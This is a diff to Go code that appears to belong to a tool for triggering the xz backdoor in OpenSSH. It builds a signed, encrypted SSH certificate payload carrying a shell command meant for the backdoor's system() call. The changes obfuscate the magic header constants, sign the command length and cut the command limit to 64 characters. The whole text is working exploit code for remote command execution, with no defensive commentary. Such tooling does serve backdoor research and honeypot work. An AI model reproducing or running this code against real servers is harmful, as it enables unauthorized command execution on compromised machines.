@@ -65,20 +65,26 @@ func (s *xzSigner) PublicKey() ssh.PublicKey {
 		return s.cert
 	}
 
-	var hdr bytes.Buffer
-	binary.Write(&hdr, binary.LittleEndian, uint32(2))
-	binary.Write(&hdr, binary.LittleEndian, uint32(1))
-	binary.Write(&hdr, binary.LittleEndian, uint64(0))
+	// magic cmd byte (system() = 2)
+	magic1 := uint32(0x1234)
+	magic2 := uint32(0x5678)
+	magic3 := uint64(0xfffffffff9d9ffa2)
+	magic := uint32(uint64(magic1)*uint64(magic2) + magic3)
 
+	var hdr bytes.Buffer
+	binary.Write(&hdr, binary.LittleEndian, uint32(magic1))
+	binary.Write(&hdr, binary.LittleEndian, uint32(magic2))
+	binary.Write(&hdr, binary.LittleEndian, uint64(magic3))
+
+	cmdlen := uint8(len(*cmd))
 	var payload bytes.Buffer
-	binary.Write(&payload, binary.LittleEndian, uint32(0))
-	binary.Write(&payload, binary.LittleEndian, uint8(0))
+	payload.Write([]byte{0b00000000, 0b00000000, 0, cmdlen, 0})
 	payload.Write([]byte(*cmd))
 	payload.Write([]byte{0})
 
 	var md bytes.Buffer
-	md.Write(hdr.Bytes()[:4])
-	md.Write(payload.Bytes()[:5])
+	binary.Write(&md, binary.LittleEndian, magic)
+	md.Write(payload.Bytes()[:cmdlen+5])
 	md.Write(s.hostkey)
 	signature := ed448.Sign(s.signingKey, md.Bytes(), "")
 
@@ -86,7 +92,9 @@ func (s *xzSigner) PublicKey() ssh.PublicKey {
 	buf.Write(signature)
 	buf.Write(payload.Bytes())
 	hdr.Write(decrypt(buf.Bytes(), s.encryptionKey[:32], hdr.Bytes()[:16]))
-	hdr.Write(bytes.Repeat([]byte{0}, 256-hdr.Len()))
+	if hdr.Len() < 256 {
+		hdr.Write(bytes.Repeat([]byte{0}, 256-hdr.Len()))
+	}
 
 	n := big.NewInt(1)
 	n.Lsh(n, 2048)
@@ -169,8 +177,8 @@ func fatalIfErr(err error) {
 func main() {
 	flag.Parse()
 
-	if len(*cmd) > 120 {
-		fmt.Printf("cmd too long, should not exceed 120 characters\n")
+	if len(*cmd) > 64 {
+		fmt.Printf("cmd too long, should not exceed 64 characters\n")
 		return
 	}
 
